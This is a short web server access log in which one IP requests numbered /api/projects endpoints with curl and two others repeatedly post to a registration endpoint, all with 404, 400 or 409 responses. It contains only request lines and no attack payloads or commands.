146.70.41.18 - - [02/Jun/2025:01:00:08 +0000] "GET /api/projects/4 HTTP/1.1" 404 89 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:08 +0000] "GET /api/projects/8 HTTP/1.1" 404 150 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:12 +0000] "POST /api/auth/register HTTP/1.1" 400 105 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:13 +0000] "GET /api/projects/13 HTTP/1.1" 404 136 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:14 +0000] "GET /api/projects/14 HTTP/1.1" 404 68 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:15 +0000] "GET /api/projects/15 HTTP/1.1" 404 25 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:16 +0000] "GET /api/projects/16 HTTP/1.1" 404 106 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:16 +0000] "POST /api/auth/register HTTP/1.1" 409 138 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:20 +0000] "GET /api/projects/10 HTTP/1.1" 404 13 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:24 +0000] "GET /api/projects/12 HTTP/1.1" 404 100 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 85 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:27 +0000] "GET /api/projects/9 HTTP/1.1" 404 50 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:30 +0000] "POST /api/auth/register HTTP/1.1" 409 87 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:33 +0000] "GET /api/projects/11 HTTP/1.1" 404 77 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:33 +0000] "POST /api/auth/register HTTP/1.1" 409 191 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:36 +0000] "POST /api/auth/register HTTP/1.1" 409 152 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:36 +0000] "POST /api/auth/register HTTP/1.1" 409 140 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:52 +0000] "POST /api/auth/register HTTP/1.1" 400 161 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:00 +0000] "POST /api/auth/register HTTP/1.1" 409 132 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:02 +0000] "POST /api/auth/register HTTP/1.1" 409 170 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:03 +0000] "POST /api/auth/register HTTP/1.1" 400 196 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 86 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 400 127 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:09 +0000] "POST /api/auth/register HTTP/1.1" 400 182 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:10 +0000] "POST /api/auth/register HTTP/1.1" 409 100 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 100 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 138 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:19 +0000] "POST /api/auth/register HTTP/1.1" 400 166 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:28 +0000] "POST /api/auth/register HTTP/1.1" 409 87 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:28 +0000] "POST /api/auth/register HTTP/1.1" 400 124 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:32 +0000] "POST /api/auth/register HTTP/1.1" 409 142 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:36 +0000] "POST /api/auth/register HTTP/1.1" 400 131 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:39 +0000] "POST /api/auth/register HTTP/1.1" 409 143 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:40 +0000] "POST /api/auth/register HTTP/1.1" 409 197 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:44 +0000] "POST /api/auth/register HTTP/1.1" 409 92 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:48 +0000] "POST /api/auth/register HTTP/1.1" 400 140 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:51 +0000] "POST /api/auth/register HTTP/1.1" 400 151 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:01:00 +0000] "POST /api/auth/register HTTP/1.1" 400 96 "-" "python-requests/2.28.0"
